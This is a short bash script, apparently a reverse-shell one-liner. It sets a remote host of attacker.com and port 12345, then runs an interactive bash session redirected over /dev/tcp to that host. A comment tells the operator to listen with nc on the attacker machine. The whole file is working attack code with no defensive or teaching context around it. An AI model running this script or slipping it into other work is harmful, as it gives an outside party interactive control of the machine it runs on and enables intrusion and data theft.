#!/bin/bash

#Run nc -l -p 12345 on the attacker box to receive the shell.
export RHOST=attacker.com
export RPORT=12345
bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'

